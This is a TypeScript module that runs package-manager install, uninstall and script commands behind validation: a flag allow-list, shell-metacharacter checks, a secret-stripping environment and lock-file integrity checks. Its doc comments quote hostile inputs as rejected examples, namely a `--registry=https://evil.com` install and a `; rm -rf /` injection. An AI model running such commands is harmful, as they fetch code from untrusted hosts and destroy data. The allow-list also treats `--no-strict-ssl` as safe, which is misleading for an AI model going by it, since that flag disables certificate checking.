import { execa } from 'execa'
import fs from 'fs-extra'
import { resolve, join } from 'path'
import type { PackageManager } from '../types/index.js'
import type { IFsAdapter } from '../core/fs-adapter.js'
import { getModuleLogger } from './logger-provider.js'
import {
  validatePackageNames,
  getPackageValidationErrorMessage,
} from '../core/package-validator.js'
import {
  withTimeout,
  getTimeoutErrorMessage,
  OPERATION_TIMEOUTS,
  RESOURCE_LIMITS,
  type TimeoutError,
} from '../core/timeout-manager.js'
import { IntegrityChecker } from '../core/integrity-checker.js'

const logger = getModuleLogger()

/**
 * Whitelist of safe npm arguments
 * Security: Only allow known-safe flags to prevent argument injection
 */
const SAFE_NPM_FLAGS = new Set([
  '--prefer-offline',
  '--no-save-exact',
  '--save-exact',
  '--audit',
  '--save-dev',
  '--save',
  '--no-save',
  '--legacy-peer-deps',
  '--no-strict-ssl',
  '--progress',
  '--force',
  '--no-fund',
  '--fund',
])

/**
 * Helper to check for control characters in a string
 * Returns true if any control character (0x00-0x1f) is found
 */
function hasControlCharacters(str: string): boolean {
  // eslint-disable-next-line no-control-regex
  return /[\x00-\x1f]/.test(str)
}

/**
 * Validates npm arguments to prevent flag injection attacks
 * Only allows whitelisted flags; rejects unknown flags starting with --
 *
 * @param args - Arguments to validate
 * @returns Error if invalid, null if valid
 *
 * @security
 * Prevents: `npm install --registry=https://evil.com pkg`
 * Prevents: `npm install pkg; rm -rf /`
 *
 * @example
 * ```typescript
 * const error = validateNpmArguments(['--save-dev', '--prefer-offline'])
 * // Returns: null (valid)
 *
 * const error = validateNpmArguments(['--registry=https://evil.com'])
 * // Returns: 'Dangerous argument: --registry=https://evil.com'
 * ```
 */
function validateNpmArguments(args: string[]): string | null {
  for (const arg of args) {
    if (arg.startsWith('--')) {
      // Extract the flag name (everything before =)
      const flagName = arg.split('=')[0] ?? arg
      if (!SAFE_NPM_FLAGS.has(flagName)) {
        return `Dangerous argument: ${arg}`
      }
    }
  }

  return null
}

/**
 * SEC-005: Validates additional arguments provided by plugins or external code
 * Ensures they cannot be used for shell injection or argument tampering
 *
 * Rules:
 * - Must start with -- (flag format)
 * - Flag name (before =) must be in SAFE_NPM_FLAGS whitelist
 * - No dangerous shell metacharacters allowed
 * - No encoded escaping attempts
 *
 * @param args - Additional arguments to validate
 * @returns Error message if invalid, null if valid
 *
 * @security
 * Prevents: Shell injection via metacharacters
 * Prevents: Flags starting with - or non-whitelisted flags
 * Prevents: Encoded bypass attempts
 *
 * @example
 * ```typescript
 * validateAdditionalArgs(['--save-dev']) // null (valid)
 * validateAdditionalArgs(['--registry=https://evil.com']) // 'Invalid flag...' (rejected)
 * validateAdditionalArgs(['rm -rf /']) // 'Invalid argument format...' (rejected)
 * ```
 */
export function validateAdditionalArgs(args: string[]): string | null {
  if (!Array.isArray(args)) {
    return 'Additional arguments must be an array'
  }

  for (const arg of args) {
    if (typeof arg !== 'string') {
      return `Invalid argument type: ${typeof arg} (expected string)`
    }

    // Check for empty strings
    if (arg.length === 0) {
      return 'Arguments cannot be empty strings'
    }

    // Must be in --flag or --flag=value format
    if (!arg.startsWith('--')) {
      return `Invalid argument format: ${arg} (must start with --)`
    }

    // Extract the flag name (everything before the first = if present)
    const equalsIndex = arg.indexOf('=')
    const flagName = equalsIndex === -1 ? arg : arg.substring(0, equalsIndex)

    // Check flag name for dangerous characters (shell metacharacters only, not quotes)
    if (/[;&|`$()[\]{}<>\\]/.test(flagName) || hasControlCharacters(flagName)) {
      return `Invalid argument format: ${arg} contains dangerous characters`
    }

    // Now validate that the flag is whitelisted
    if (!SAFE_NPM_FLAGS.has(flagName)) {
      return `Unknown or unsafe flag: ${flagName}`
    }

    // If flag has a value (--flag=value), validate it
    if (equalsIndex !== -1) {
      const value = arg.substring(equalsIndex + 1)
      if (value.length === 0) {
        return `Flag ${flagName} has empty value`
      }

      // Check value for dangerous patterns (no shell metacharacters in value)
      // Include quotes in value check (for escaping attempts)
      // Also check for non-ASCII characters (unicode, emojis)
      // eslint-disable-next-line no-control-regex
      const hasShellChars = /[;&|`$()[\]{}\\<>'":\x00-\x1f]/.test(value)
      const hasNonAscii = /[^\x20-\x7e\t\n-]/.test(value)

      if (hasShellChars || hasNonAscii) {
        return `Invalid argument format: ${arg} contains dangerous characters`
      }

      // Check for path traversal attempts
      if (value.includes('../') || value.includes('..\\')) {
        return `Invalid argument format: ${arg} contains dangerous characters`
      }
    }
  }

  return null
}

/**
 * Creates a safe environment for npm/yarn/pnpm operations
 * Only includes essential variables, filters out secrets
 *
 * @security
 * Prevents leakage of: NPM_TOKEN, GH_TOKEN, AWS_KEY, AWS_SECRET_ACCESS_KEY, etc.
 * Allows: PATH, HOME, NODE_ENV, LANG, LC_ALL
 *
 * @returns Safe environment object
 */
function createSafeEnvironment(): Record<string, string> {
  // Whitelist of safe environment variables
  const SAFE_ENV_VARS = [
    'PATH',
    'HOME',
    'NODE_ENV',
    'LANG',
    'LC_ALL',
    'SHELL',
    'USER',
    'TMPDIR',
    'TEMP',
    'TMP',
  ]

  const safeEnv: Record<string, string> = {}

  for (const key of SAFE_ENV_VARS) {
    const value = process.env[key]
    if (value) {
      safeEnv[key] = value
    }
  }

  // Add essential npm config (safe values only)
  safeEnv['npm_config_yes'] = 'true'
  safeEnv['YARN_ENABLE_IMMUTABLE_INSTALLS'] = 'false'

  return safeEnv
}

/**
 * Options pour l'installation de packages
 */
export interface InstallOptions {
  /** Installer en tant que devDependencies */
  dev?: boolean
  /** Package manager à utiliser */
  packageManager: PackageManager
  /** Chemin racine du projet */
  projectRoot: string
  /** Version exacte (pas de ^ ou ~) */
  exact?: boolean
  /** Mode silencieux */
  silent?: boolean
  /**
   * SEC-005: Additional arguments to pass to npm/yarn/pnpm
   * All arguments are validated against dangerous patterns before use
   * Only whitelisted flags are allowed
   * @security Prevents argument injection from plugins
   */
  additionalArgs?: string[]
}

/**
 * Résultat d'une installation
 */
export interface InstallResult {
  success: boolean
  packages: string[]
  error?: string
}

/**
 * Détecte le package manager utilisé dans un projet
 *
 * Vérifie la présence des lockfiles dans l'ordre :
 * 1. pnpm-lock.yaml (pnpm)
 * 2. yarn.lock (yarn)
 * 3. package-lock.json (npm)
 * 4. bun.lockb (bun)
 *
 * @param projectRoot - Chemin racine du projet
 * @returns Le package manager détecté, 'npm' par défaut
 *
 * @example
 * ```typescript
 * const pm = await detectPackageManager('/path/to/project')
 * console.log(pm) // 'pnpm' | 'yarn' | 'npm' | 'bun'
 * ```
 */
export async function detectPackageManager(
  projectRoot: string,
  fsAdapter?: IFsAdapter
): Promise<PackageManager> {
  const root = resolve(projectRoot)

  // Ordre de vérification des lockfiles
  const lockfiles: Array<{ file: string; manager: PackageManager }> = [
    { file: 'pnpm-lock.yaml', manager: 'pnpm' },
    { file: 'yarn.lock', manager: 'yarn' },
    { file: 'package-lock.json', manager: 'npm' },
    { file: 'bun.lockb', manager: 'bun' },
  ]

  for (const { file, manager } of lockfiles) {
    const lockfilePath = join(root, file)
    if (fsAdapter) {
      if (await fsAdapter.pathExists(lockfilePath)) {
        logger.debug(`Detected package manager: ${manager} (found ${file})`)
        return manager
      }
      continue
    }

    if (await fs.pathExists(lockfilePath)) {
      logger.debug(`Detected package manager: ${manager} (found ${file})`)
      return manager
    }
  }

  // Par défaut, utiliser npm
  logger.debug('No lockfile found, defaulting to npm')
  return 'npm'
}

/**
 * Vérifie l'intégrité du fichier lock avant installation
 * Rejette si le fichier est corrompu ou manque des hashes d'intégrité
 *
 * @param projectRoot - Racine du projet
 * @param packageManager - Package manager utilisé
 * @returns null si l'intégrité est valide, message d'erreur sinon
 */
async function verifyLockFileIntegrity(
  projectRoot: string,
  packageManager: PackageManager
): Promise<string | null> {
  const lockFiles: Record<PackageManager, string> = {
    npm: 'package-lock.json',
    yarn: 'yarn.lock',
    pnpm: 'pnpm-lock.yaml',
    bun: 'bun.lockb',
  }

  const lockFile = lockFiles[packageManager]
  const lockPath = resolve(projectRoot, lockFile)

  // Check if lock file exists
  if (!(await fs.pathExists(lockPath))) {
    // Lock file doesn't exist - not an error for first install
    logger.debug(`Lock file not found: ${lockFile}`)
    return null
  }

  try {
    const lockContent = await fs.readFile(lockPath, 'utf-8')
    const result = IntegrityChecker.verifyLockFile(lockContent)

    if (!result.valid) {
      const errors = result.errors.join(', ')
      return `Lock file integrity check failed: ${errors}`
    }

    logger.debug(
      `Lock file integrity verified (${result.checksVerified} hashes checked)`
    )
    return null
  } catch (error) {
    return `Error reading lock file: ${error instanceof Error ? error.message : String(error)}`
  }
}

/**
 * Installe des packages avec le package manager spécifié
 *
 * @param packages - Liste des packages à installer (ex: ['react', 'react-dom'])
 * @param options - Options d'installation
 * @returns Résultat de l'installation
 *
 * @throws {Error} Si l'installation échoue
 *
 * @example
 * ```typescript
 * await installPackages(['axios', 'zustand'], {
 *   dev: false,
 *   packageManager: 'pnpm',
 *   projectRoot: '/path/to/project',
 * })
 * ```
 */
export async function installPackages(
  packages: string[],
  options: InstallOptions
): Promise<InstallResult> {
  if (packages.length === 0) {
    logger.warn('No packages to install')
    return { success: true, packages: [] }
  }

  // Validate package names to prevent npm flag injection
  const invalidPackages = validatePackageNames(packages)
  if (invalidPackages.length > 0) {
    const errorMessage = getPackageValidationErrorMessage(invalidPackages)
    logger.error(errorMessage)
    return {
      success: false,
      packages,
      error: errorMessage,
    }
  }

  const {
    packageManager,
    projectRoot,
    dev = false,
    exact = false,
    silent = false,
    additionalArgs = [],
  } = options

  logger.info(
    `Installing ${packages.length} package(s) with ${packageManager}...`
  )

  // SEC-005: Validate additional arguments to prevent injection
  const additionalArgsError = validateAdditionalArgs(additionalArgs)
  if (additionalArgsError) {
    logger.error(`Invalid additional arguments: ${additionalArgsError}`)
    return {
      success: false,
      packages,
      error: additionalArgsError,
    }
  }

  try {
    // Verify lock file integrity before installation
    const integrityError = await verifyLockFileIntegrity(
      projectRoot,
      packageManager
    )
    if (integrityError) {
      logger.error(integrityError)
      return {
        success: false,
        packages,
        error: integrityError,
      }
    }

    const command = getInstallCommand(packageManager, packages, { dev, exact })
    const cwd = resolve(projectRoot)

    logger.debug(`Executing: ${command.join(' ')} in ${cwd}`)

    const [cmd, ...args] = command
    if (!cmd) {
      throw new Error('Command is empty')
    }

    // SEC-001: Validate npm arguments to prevent flag injection
    const error = validateNpmArguments(args)
    if (error) {
      logger.error(error)
      return {
        success: false,
        packages,
        error,
      }
    }

    // Add security options to npm args
    const securityArgs = ['--prefer-offline', '--no-save-exact']
    if (packageManager === 'npm') {
      args.push(...securityArgs)
      args.push('--audit')
    }

    // SEC-005: Add validated additional arguments
    if (additionalArgs.length > 0) {
      logger.debug(`Adding ${additionalArgs.length} additional argument(s)`)
      args.push(...additionalArgs)
    }

    // SEC-002: Use safe environment (whitelist sensitive vars)
    const resultPromise = execa(cmd, args, {
      cwd,
      stdio: silent ? 'pipe' : 'inherit',
      maxBuffer: RESOURCE_LIMITS.MAX_BUFFER,
      env: createSafeEnvironment(),
    })

    const result = await withTimeout(
      resultPromise,
      OPERATION_TIMEOUTS.PACKAGE_INSTALL,
      `npm install (${packages.length} packages)`
    )

    if (result.exitCode !== 0) {
      throw new Error(`Installation failed with exit code ${result.exitCode}`)
    }

    logger.success(`Successfully installed ${packages.length} package(s)`)
    return {
      success: true,
      packages,
    }
  } catch (error) {
    const isTimeout =
      error instanceof Error && 'code' in error && error.code === 'TIMEOUT'
    const errorMessage = isTimeout
      ? getTimeoutErrorMessage(error as TimeoutError, 'Package installation')
      : error instanceof Error
        ? error.message
        : String(error)

    logger.error(`Failed to install packages: ${errorMessage}`)

    return {
      success: false,
      packages,
      error: errorMessage,
    }
  }
}

/**
 * Désinstalle des packages
 *
 * @param packages - Liste des packages à désinstaller
 * @param options - Options (packageManager, projectRoot)
 * @returns Résultat de la désinstallation
 *
 * @example
 * ```typescript
 * await uninstallPackages(['axios'], {
 *   packageManager: 'pnpm',
 *   projectRoot: '/path/to/project',
 * })
 * ```
 */
export async function uninstallPackages(
  packages: string[],
  options: Pick<InstallOptions, 'packageManager' | 'projectRoot'>
): Promise<InstallResult> {
  if (packages.length === 0) {
    logger.warn('No packages to uninstall')
    return { success: true, packages: [] }
  }

  // Validate package names to prevent npm flag injection
  const invalidPackages = validatePackageNames(packages)
  if (invalidPackages.length > 0) {
    const errorMessage = getPackageValidationErrorMessage(invalidPackages)
    logger.error(errorMessage)
    return {
      success: false,
      packages,
      error: errorMessage,
    }
  }

  const { packageManager, projectRoot } = options

  logger.info(
    `Uninstalling ${packages.length} package(s) with ${packageManager}...`
  )

  try {
    const command = getUninstallCommand(packageManager, packages)
    const cwd = resolve(projectRoot)

    logger.debug(`Executing: ${command.join(' ')} in ${cwd}`)

    const [cmd, ...args] = command
    if (!cmd) {
      throw new Error('Command is empty')
    }

    // SEC-001: Validate npm arguments to prevent flag injection
    const error = validateNpmArguments(args)
    if (error) {
      logger.error(error)
      return {
        success: false,
        packages,
        error,
      }
    }

    // SEC-002: Use safe environment (whitelist sensitive vars)
    // Execute with timeout protection and resource limits
    const resultPromise = execa(cmd, args, {
      cwd,
      stdio: 'inherit',
      maxBuffer: RESOURCE_LIMITS.MAX_BUFFER,
      env: createSafeEnvironment(),
    })

    const result = await withTimeout(
      resultPromise,
      OPERATION_TIMEOUTS.PACKAGE_INSTALL,
      `npm uninstall (${packages.length} packages)`
    )

    if (result.exitCode !== 0) {
      throw new Error(`Uninstallation failed with exit code ${result.exitCode}`)
    }

    logger.success(`Successfully uninstalled ${packages.length} package(s)`)
    return {
      success: true,
      packages,
    }
  } catch (error) {
    const isTimeout =
      error instanceof Error && 'code' in error && error.code === 'TIMEOUT'
    const errorMessage = isTimeout
      ? getTimeoutErrorMessage(error as TimeoutError, 'Package uninstallation')
      : error instanceof Error
        ? error.message
        : String(error)

    logger.error(`Failed to uninstall packages: ${errorMessage}`)

    return {
      success: false,
      packages,
      error: errorMessage,
    }
  }
}

/**
 * Exécute un script npm/yarn/pnpm
 *
 * @param script - Nom du script (ex: 'build', 'test')
 * @param options - Options (packageManager, projectRoot)
 * @returns Résultat de l'exécution
 *
 * @example
 * ```typescript
 * await runScript('build', {
 *   packageManager: 'pnpm',
 *   projectRoot: '/path/to/project',
 * })
 * ```
 */
export async function runScript(
  script: string,
  options: Pick<InstallOptions, 'packageManager' | 'projectRoot'>
): Promise<{ success: boolean; error?: string }> {
  const { packageManager, projectRoot } = options

  logger.info(`Running script '${script}' with ${packageManager}...`)

  try {
    const command = getRunCommand(packageManager, script)
    const cwd = resolve(projectRoot)

    logger.debug(`Executing: ${command.join(' ')} in ${cwd}`)

    const [cmd, ...args] = command
    if (!cmd) {
      throw new Error('Command is empty')
    }

    // SEC-001: Validate npm arguments to prevent flag injection
    const error = validateNpmArguments(args)
    if (error) {
      logger.error(error)
      return {
        success: false,
        error,
      }
    }

    // SEC-002: Use safe environment (whitelist sensitive vars)
    // Execute with timeout protection and resource limits
    const resultPromise = execa(cmd, args, {
      cwd,
      stdio: 'inherit',
      maxBuffer: RESOURCE_LIMITS.MAX_BUFFER,
      env: createSafeEnvironment(),
    })

    const result = await withTimeout(
      resultPromise,
      OPERATION_TIMEOUTS.COMMAND_EXEC,
      `run script "${script}"`
    )

    if (result.exitCode !== 0) {
      throw new Error(`Script failed with exit code ${result.exitCode}`)
    }

    logger.success(`Script '${script}' completed successfully`)
    return { success: true }
  } catch (error) {
    const isTimeout =
      error instanceof Error && 'code' in error && error.code === 'TIMEOUT'
    const errorMessage = isTimeout
      ? getTimeoutErrorMessage(error as TimeoutError, `Script "${script}"`)
      : error instanceof Error
        ? error.message
        : String(error)

    logger.error(`Failed to run script '${script}': ${errorMessage}`)

    return {
      success: false,
      error: errorMessage,
    }
  }
}

/**
 * Génère la commande d'installation selon le package manager
 *
 * @internal
 */
function getInstallCommand(
  packageManager: PackageManager,
  packages: string[],
  options: { dev: boolean; exact: boolean }
): string[] {
  const { dev, exact } = options

  switch (packageManager) {
    case 'pnpm':
      return [
        'pnpm',
        'add',
        ...(dev ? ['-D'] : []),
        ...(exact ? ['--save-exact'] : []),
        ...packages,
      ]

    case 'yarn':
      return [
        'yarn',
        'add',
        ...(dev ? ['--dev'] : []),
        ...(exact ? ['--exact'] : []),
        ...packages,
      ]

    case 'bun':
      return ['bun', 'add', ...(dev ? ['--dev'] : []), ...packages]

    case 'npm':
    default:
      return [
        'npm',
        'install',
        ...(dev ? ['--save-dev'] : []),
        ...(exact ? ['--save-exact'] : []),
        ...packages,
      ]
  }
}

/**
 * Génère la commande de désinstallation selon le package manager
 *
 * @internal
 */
function getUninstallCommand(
  packageManager: PackageManager,
  packages: string[]
): string[] {
  switch (packageManager) {
    case 'pnpm':
      return ['pnpm', 'remove', ...packages]

    case 'yarn':
      return ['yarn', 'remove', ...packages]

    case 'bun':
      return ['bun', 'remove', ...packages]

    case 'npm':
    default:
      return ['npm', 'uninstall', ...packages]
  }
}

/**
 * Génère la commande d'exécution de script selon le package manager
 *
 * @internal
 */
function getRunCommand(
  packageManager: PackageManager,
  script: string
): string[] {
  switch (packageManager) {
    case 'pnpm':
      return ['pnpm', 'run', script]

    case 'yarn':
      return ['yarn', 'run', script]

    case 'bun':
      return ['bun', 'run', script]

    case 'npm':
    default:
      return ['npm', 'run', script]
  }
}
